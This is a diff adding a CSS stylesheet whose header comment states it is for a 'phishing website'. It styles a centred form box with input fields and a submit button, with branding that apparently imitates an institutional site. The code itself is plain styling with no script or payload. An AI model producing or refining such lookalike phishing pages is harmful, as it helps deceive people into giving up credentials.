@@ -1,0 +1,101 @@
+/* 
+    Name:      style.css
+
+    Purpose:   style file for phishing website
+    Author:    nuna ⑨
+    Created:   12/1/2025 
+*/
+
+body {
+    font-family: "CoV Noto Sans", Helvetica, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #ffffff;
+    text-align: center;
+}
+
+.container {
+    max-width: 1100px;
+    margin: auto;
+    padding-top: 20px;
+}
+
+section {
+    margin: 20px;
+    padding: 20px;
+    box-shadow: 0 0 25px #1e81b0;
+    background: 
+        linear-gradient(rgba(255, 255, 255, 0.5), rgba(255, 255, 255, 0.4)),
+        url("/static/wellness_bg.jpg") center center / cover no-repeat;
+}
+
+.form_box {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    max-width: 400px;
+    margin: 0 auto;
+    padding: 20px;
+    background: #0279b1;
+    border-radius: 12px;
+    transition: transform 0.3s ease;
+}
+
+.form_box:hover {
+    transform: translateY(-3px);
+}
+
+.form_box input {
+    width: 100%;
+    padding: 12px 15px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 1rem;
+    box-sizing: border-box;
+    transition: all 0.2s ease-in-out;
+}
+
+.form_box input:focus {
+    outline: none;
+    border-color: #c7ff96;
+    box-shadow: 0 0 8px #517d2b;
+}
+
+.form_box button {
+    width: 100%;
+    padding: 12px 0;
+    background: #69b526;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 1rem;
+    text-transform: uppercase;
+    transition: all 0.2s ease-in-out;
+}
+
+.form_box button:hover {
+    background: #4b8419;
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+}
+
+.image_header {
+    width: 100%;
+    background: url("/static/header.jpg") center center / cover no-repeat;
+    background-size: auto;
+    height: auto;
+    padding-top: 20%; 
+}
+
+.image_footer {
+    width: 1065px; 
+    max-width: 100%;
+    height: 0;
+    padding-bottom: 40%; 
+    background: url("/static/footer.jpg") center top / contain no-repeat;
+    margin: 80px auto 5px auto;
+}
+
